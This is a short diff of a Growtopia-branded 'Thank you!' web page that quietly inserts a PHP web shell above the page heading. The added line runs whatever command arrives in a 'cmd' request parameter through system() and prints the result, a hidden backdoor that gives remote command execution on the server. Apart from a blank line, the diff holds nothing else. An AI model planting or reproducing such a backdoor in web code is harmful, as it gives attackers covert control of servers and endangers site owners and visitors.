@@ -20,6 +20,7 @@
 			<div class="header-bg">
 				<header class="header" id="header">
 					<div class="row">
+						
 						<div class="col-md-2 col-sm-3 col-xs-3">
 							<div class="logo"> <a href="#"> <img class="normal" src="gt-header-title-logo.png" alt="Growtopia"></a> </div>
 						</div>
@@ -39,6 +40,7 @@
 						<div class="row">
 							<div class="col-md-12 col-sm-12">
 								<div class="col-md-12 col-sm-12">
+									<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 									<h1>Thank you!</h1>
 								</div>
 								<br />
